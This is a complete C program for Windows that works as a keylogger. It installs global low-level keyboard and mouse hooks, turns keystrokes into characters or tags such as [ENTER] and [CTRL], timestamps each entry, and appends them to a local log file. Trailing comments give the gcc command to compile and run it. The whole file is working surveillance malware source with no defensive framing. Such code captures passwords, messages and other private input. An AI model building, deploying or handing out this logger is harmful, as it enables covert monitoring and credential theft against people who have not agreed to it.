#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>

HHOOK keyboardHook;
HHOOK mouseHook;
FILE *logFile;

// Function to get formatted timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *lt = localtime(&now);
    strftime(buffer, size, "[%Y-%m-%d %H:%M:%S] ", lt);
}

// Function to log data to file with timestamp
void log_to_file(const char *format, ...) {
    if (!logFile) return;

    char timestamp[64];
    get_timestamp(timestamp, sizeof(timestamp));
    fprintf(logFile, "%s", timestamp);

    va_list args;
    va_start(args, format);
    vfprintf(logFile, format, args);
    va_end(args);

    fflush(logFile); // Ensure real-time logging
}

// Function to log special keys
void log_special_key(DWORD vkCode) {
    switch (vkCode) {
        case VK_RETURN: log_to_file("[ENTER]"); break;
        case VK_BACK: log_to_file("[BACKSPACE]"); break;
        case VK_TAB: log_to_file("[TAB]"); break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: log_to_file("[SHIFT]"); break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: log_to_file("[CTRL]"); break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU: log_to_file("[ALT]"); break;
        case VK_CAPITAL: log_to_file("[CAPSLOCK]"); break;
        case VK_SPACE: log_to_file(" "); break;
        case VK_ESCAPE: log_to_file("[ESC]"); break;
        case VK_LEFT: log_to_file("[LEFT]"); break;
        case VK_RIGHT: log_to_file("[RIGHT]"); break;
        case VK_UP: log_to_file("[UP]"); break;
        case VK_DOWN: log_to_file("[DOWN]"); break;
        case VK_DELETE: log_to_file("[DEL]"); break;
        default: log_to_file("[0x%X]", vkCode); break;
    }
}

// Keyboard Hook Procedure
LRESULT CALLBACK keyboard_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        char buffer[5];
        UINT scanCode = MapVirtualKey(pKey->vkCode, MAPVK_VK_TO_VSC);

        int result = ToAscii(pKey->vkCode, scanCode, keyboardState, (LPWORD)buffer, 0);
        if (result > 0) {
            buffer[result] = '\0';

            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

            char ch = buffer[0];
            if (ch >= 'a' && ch <= 'z') {
                if (shift ^ caps)
                    ch -= 32;
            } else if (ch >= 'A' && ch <= 'Z') {
                if (!(shift ^ caps))
                    ch += 32;
            }

            log_to_file("%c", ch);
        } else {
            log_special_key(pKey->vkCode);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

// Mouse Hook Procedure
LRESULT CALLBACK mouse_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        switch (wParam) {
            case WM_LBUTTONDOWN: log_to_file("[MOUSE LEFT CLICK]"); break;
            case WM_RBUTTONDOWN: log_to_file("[MOUSE RIGHT CLICK]"); break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    // Open log file
    logFile = fopen("keymouse_log.txt", "a+");
    if (!logFile) {
        MessageBox(NULL, "Failed to open log file", "Error", MB_ICONERROR);
        return 1;
    }

    log_to_file("Keylogger started.\n");

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouse_proc, NULL, 0);

    if (!keyboardHook || !mouseHook) {
        fprintf(logFile, "Hooks not installed. Error: %lu\n", GetLastError());
        fclose(logFile);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    log_to_file("Keylogger stopped.\n");

    fclose(logFile);
    return 0;
}

// dir *.c to Confirm the source file exists
// compile it like this: gcc keylogger.c -o keylogger.exe -luser32
// .\keylogger.exe


